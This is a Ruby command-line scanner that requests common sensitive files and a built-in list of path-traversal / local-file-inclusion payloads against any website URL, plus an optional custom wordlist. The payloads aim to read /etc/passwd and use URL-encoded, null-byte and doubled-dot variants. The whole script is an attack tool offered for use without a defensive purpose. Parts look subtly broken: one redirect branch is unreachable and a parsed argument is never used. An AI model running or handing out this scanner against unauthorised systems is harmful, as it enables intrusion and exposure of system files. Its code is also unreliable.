require 'net/http'

def check_file(url, file)
  uri = URI.join(url, file)
  response = Net::HTTP.get_response(uri)

  case response
  when Net::HTTPSuccess
    puts "File #{file} exists"
    return true
  when Net::HTTPRedirection
    puts "Redirect detected for #{file}"
    return false
  when Net::HTTPNotFound
    puts "404 Error for #{file}"
    return false
  when Net::HTTPForbidden
    puts "403 Forbidden for #{file}"
    return false
  when Net::HTTPFound
    puts "302 Found for #{file}"
    return false
  else
    puts "Unexpected error for #{file}: #{response.code} #{response.message}"
    return false
  end
rescue StandardError => e
  puts "Error checking #{file}: #{e.message}"
  return false
end

def check_vulnerabilities(url, payloads, wordlist_file = nil, skip_default_payloads = false)
  default_payloads = [
    "robots.txt",
    "sitemap.xml",
    "README.md",
    "php.ini",
    "web.config",
    ".htaccess",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "etc/passwd",
    "....//....//etc/passwd",
    "../../../../etc/passwd%00.png",
    "var/www/html/../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "etc%2Fpasswd",
    "....%2F%2F....%2F%2Fetc%2Fpasswd"
  ]

  puts "\nStarting vulnerability scan..."
  puts "==============================="

  unless skip_default_payloads
    puts "\nRunning default payload scan..."
    default_payloads.each do |payload|
      puts "\n#{payload} exists: #{check_file(url, payload)}"
    end
  end

  if wordlist_file
    puts "\nRunning LFI scan with custom wordlist..."
    run_lfi_scan(url, wordlist_file)
  end
end

def run_lfi_scan(url, wordlist_file)
  puts "Running LFI scan with wordlist: #{wordlist_file}"

  File.readlines(wordlist_file).each do |line|
    lfi_payload = line.chomp
    puts "\n#{lfi_payload} exists: #{check_file(url, lfi_payload)}"
  end
end

def usage
  puts "Usage: ruby script.rb <website_url> [--wordlist <wordlist_file>] [--skip-default-payloads]"
  puts "Example: ruby script.rb https://example.com --wordlist wordlist.txt --skip-default-payloads"
  puts "Wordlist file is optional."
end

if ARGV.empty?
  usage
else
  website_url = ARGV.shift
  payloads = ARGV.shift(ARGV.index { |arg| arg.start_with?('-') } || ARGV.size)
  wordlist_index = ARGV.index("--wordlist")
  wordlist_file = ARGV[wordlist_index + 1] if wordlist_index
  skip_default_payloads = ARGV.include?("--skip-default-payloads")

  check_vulnerabilities(website_url, payloads, wordlist_file, skip_default_payloads)
end
